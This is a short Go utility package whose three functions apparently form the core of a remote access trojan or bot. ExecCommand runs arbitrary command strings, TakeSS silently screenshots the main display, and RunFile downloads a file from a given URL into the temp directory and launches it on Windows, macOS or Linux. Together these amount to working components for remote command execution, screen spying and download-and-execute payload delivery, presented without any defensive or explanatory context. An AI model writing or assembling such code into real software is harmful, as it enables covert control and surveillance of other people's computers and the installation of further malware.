package utils

import (
	"context"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
	"strings"
	"image/png"
	"github.com/kbinani/screenshot"
	"fmt"
)

func ExecCommand(command string) string {
	args := strings.Fields(command)
	cmd := exec.Command(args[0], args[1:]...)
	out, err := cmd.Output(); if err != nil {return "Failed"}
	return string(out)
}

func TakeSS() (*os.File, error) {
	if screenshot.NumActiveDisplays() == 0 {
		return nil, fmt.Errorf("no active displays")
	}

	bounds := screenshot.GetDisplayBounds(0)

	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, err
	}

	file, err := os.CreateTemp("", "screenshot-*.png")
	if err != nil {
		return nil, err
	}

	if err := png.Encode(file, img); err != nil {
		file.Close()
		os.Remove(file.Name())
		return nil, err
	}

	if _, err := file.Seek(0, io.SeekStart); err != nil {
		file.Close()
		os.Remove(file.Name())
		return nil, err
	}

	return file, nil
}

func RunFile(fileurl string) {
	ctx, cancel := context.WithTimeout(context.Background(), 500*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, fileurl, nil)
	if err != nil {
		return
	}

	res, err := http.DefaultClient.Do(req)
	if err != nil {
		return
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		return
	}

	filename := filepath.Base(req.URL.Path)
	if filename == "." || filename == "/" || filename == "" {
		filename = "download"
	}

	tempPath := filepath.Join(os.TempDir(), filename)

	f, err := os.Create(tempPath)
	if err != nil {
		return
	}

	_, err = io.Copy(f, res.Body)
	f.Close()

	if err != nil {
		os.Remove(tempPath)
		return
	}

	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/c", "start", "", tempPath)
	case "darwin":
		cmd = exec.Command("open", tempPath)
	default:
		cmd = exec.Command("xdg-open", tempPath)
	}

	cmd.Start()
}
